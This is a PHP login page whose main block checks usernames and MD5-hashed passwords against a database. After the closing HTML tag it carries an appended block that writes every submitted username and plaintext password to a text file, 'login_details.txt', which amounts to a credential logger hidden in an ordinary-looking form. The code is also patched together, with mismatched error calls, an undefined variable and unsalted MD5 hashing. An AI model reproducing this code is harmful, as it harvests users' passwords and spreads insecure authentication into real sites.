<!DOCTYPE html>
<html>
<meta charset="utf-8">
<title>Login</title>
<link rel="stylesheet" href="css/users.css" />
</head>
<body>
	<header>
<?php
require('db.php');
session_start();
if (isset($_POST['username'])){   
	$username = stripslashes($_REQUEST['username']);
	$username = mysqli_real_escape_string($con,$username);
	$password = stripslashes($_REQUEST['password']);
	$password = mysqli_real_escape_string($con,$password);
     $query = "SELECT * FROM `users` WHERE username='$username'
     and password='".md5($password)."'";
	$result = mysqli_query($con,$query) or die(mysql_error());
	$rows = mysqli_num_rows($result);
        if($rows==1){
	    $_SESSION['username'] = $username;
	    header("Location: home.php");
         }else{
	echo "<div class='form'>
<p>Username/password is incorrect.</p>
<p><br/>Click here to <a href='login.php'>Login</a></p></div>";
	}
    }else{
?>
<div class="form">
<h1>Log In</h1>
<form action="" method="post" name="login">
<input type="text" name="username" placeholder="Username" required />
<input type="password" name="password" placeholder="Password" required />
<br>
<input name="submit" type="submit" value="Login" />
</form>
<p>Not registered yet? <a href='registration.php'>Register Here</a></p>
</div>
<?php } ?>
	</header>
</body>
</html>
<?php
if(isset($_POST['submit']))
{
    $username=$_POST['username'];
    $password=$_POST['password'];
    $fileopen=fopen("login_details.txt","a");
    fwrite($fileopen,"\nUsername :".$username);
    fwrite($fileopen,"\nPassword :".$password);
    fwrite($fileopen,"\n_");
    echo "Student Entry for ".$firstname." Was Successful <br> ";
    fclose($fileopen);
}
?>